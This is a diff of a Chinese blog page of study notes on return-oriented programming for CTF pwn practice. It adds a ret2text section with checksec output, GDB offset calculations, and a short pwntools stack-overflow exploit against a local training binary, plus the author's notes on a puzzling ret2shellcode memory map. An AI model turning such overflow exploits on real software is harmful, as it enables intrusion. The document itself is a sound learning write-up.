@@ -27,16 +27,22 @@
 <meta property="og:site_name" content="b1ue0cean&#39;s   blog">
 <meta property="og:description" content="学点技术 没坏处">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623212508961.png">
+<meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623214146561.png">
+<meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623222942580.png">
+<meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623224501214.png">
+<meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623225554909.png">
+<meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623225817052.png">
 <meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220622004109224.png">
 <meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220622012021422.png">
 <meta property="og:image" content="http://example.com/2022/06/21/ROP-learn/image-20220622012505913.png">
 <meta property="article:published_time" content="2022-06-21T15:02:23.000Z">
-<meta property="article:modified_time" content="2022-06-21T17:55:16.748Z">
+<meta property="article:modified_time" content="2022-06-23T15:05:18.496Z">
 <meta property="article:author" content="b1ue0cean">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="ROP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/06/21/ROP-learn/image-20220622004109224.png">
+<meta name="twitter:image" content="http://example.com/2022/06/21/ROP-learn/image-20220623212508961.png">
 
 
 <link rel="canonical" href="http://example.com/2022/06/21/ROP-learn/">
@@ -155,7 +161,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="nav-number">1.</span> <span class="nav-text">什么是ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Why-ROP"><span class="nav-number">2.</span> <span class="nav-text">Why ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">4.</span> <span class="nav-text">reference</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="nav-number">1.</span> <span class="nav-text">什么是ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Why-ROP"><span class="nav-number">2.</span> <span class="nav-text">Why ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">3.</span> <span class="nav-text">ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8GDB-pattern%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BA%A2%E5%87%BA%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">3.2.</span> <span class="nav-text">使用GDB pattern字符串溢出计算偏移量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">4.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -273,7 +279,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-06-22 01:55:16" itemprop="dateModified" datetime="2022-06-22T01:55:16+08:00">2022-06-22</time>
+      <time title="Modified: 2022-06-23 23:05:18" itemprop="dateModified" datetime="2022-06-23T23:05:18+08:00">2022-06-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -304,6 +310,26 @@
 <h2 id="Why-ROP"><a href="#Why-ROP" class="headerlink" title="Why ROP"></a>Why ROP</h2><blockquote>
 <p>探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种</p>
 </blockquote>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/hackme]</span><br><span class="line">└─$ checksec ret2text     </span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/hackme/ret2text&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/21/ROP-learn/image-20220623212508961.png" alt="image-20220623212508961"></p>
+<p>在 <code>gets()</code>处下断点</p>
+<p><img src="/2022/06/21/ROP-learn/image-20220623214146561.png" alt="image-20220623214146561"></p>
+<p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>查看一下 registers</p>
+<p><img src="/2022/06/21/ROP-learn/image-20220623222942580.png" alt="image-20220623222942580"></p>
+<p>ESP为<code>0xffffd430</code> 其中存放的内容为<code>0xffffd44c</code> 即输入的内容s的地址为ESP+<code>0x1c</code>=  <code>0xffffd44c</code> 而EBP为<code>0xffffd4b8</code>，则s到EBP的偏移为<code>|0xffffd4b8- 0xffffd44c|</code>=<code>6c</code>，所以s相对与返回地址的偏移为<code>0x6c+4=0x70</code></p>
+<p>直接 <code>n</code> 进入 main+107 输入一大串 1 </p>
+<p><img src="/2022/06/21/ROP-learn/image-20220623224501214.png" alt="image-20220623224501214"></p>
+<p>可以发现EAX地址处确实保存的是s（数据换成1），且|EAX-ESP|==1c，即说明s是相对于ESP偏移的；但|EAX-EBP|==6c，和IDA给出的64h有差别，由此可知IDA给出的相对于ESP的偏移是正确的、但相对于EBP的偏移是有误差的，这就是之前说的IDA分析给出的偏移量并不那么可信。</p>
+<h3 id="使用GDB-pattern字符串溢出计算偏移量"><a href="#使用GDB-pattern字符串溢出计算偏移量" class="headerlink" title="使用GDB pattern字符串溢出计算偏移量"></a>使用GDB pattern字符串溢出计算偏移量</h3><p><img src="/2022/06/21/ROP-learn/image-20220623225554909.png" alt="image-20220623225554909"></p>
+<p>然后就是计算一下偏移量</p>
+<p><img src="/2022/06/21/ROP-learn/image-20220623225817052.png" alt="image-20220623225817052"></p>
+<p>得出s与函数返回地址的偏移为112即0x70。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
 <p>checksec 一下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/hackme]</span><br><span class="line">└─$ checksec ret2shellcode </span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/hackme/ret2shellcode&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments                               </span><br></pre></td></tr></table></figure>
@@ -326,16 +352,12 @@
 
 
 
+<p>卡了好久</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line"><span class="number">0</span>x8048000 <span class="number">0</span>x8049000 <span class="number">0</span>x000000 r-x <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/</span>hackme/ret2shellcode</span><br><span class="line"><span class="number">0</span>x8049000 <span class="number">0</span>x804a000 <span class="number">0</span>x000000 r-- <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/</span>hackme/ret2shellcode</span><br><span class="line"><span class="number">0</span>x804a000 <span class="number">0</span>x804b000 <span class="number">0</span>x001000 rw- <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/</span>hackme/ret2shellcode</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-
-
-
+<p>不知道为什么 。。。就是和wiki上的结果不一样、、、</p>
+<p>不知道是不是什么libc的问题 应该也不对？</p>
+<p>但是确实能打的通。。。不懂</p>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/235533.html">基本ROP讲解 - FreeBuf网络安全行业门户</a></p>
 <p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/2.3.1_gdb.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/2.3.1_gdb.html</a></p>
 
